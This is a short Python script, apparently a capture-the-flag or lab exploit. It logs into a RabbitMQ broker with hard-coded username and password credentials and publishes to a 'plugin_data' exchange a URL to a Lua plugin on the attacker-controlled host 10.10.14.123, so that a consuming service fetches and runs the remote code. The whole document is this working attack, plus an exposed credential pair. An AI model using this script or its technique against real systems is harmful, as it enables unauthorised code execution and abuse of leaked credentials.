#!/usr/bin/env python3
import pika

connection = pika.BlockingConnection(
    pika.ConnectionParameters(
        '127.0.0.1',
        5672,
        credentials=pika.PlainCredentials('yuntao', 'EashAnicOc3Op')
    )
)

channel = connection.channel()
channel.basic_publish(
    exchange='plugin_data',
    routing_key='',
    body='http://10.10.14.123/plugin.lua'
)
connection.close()
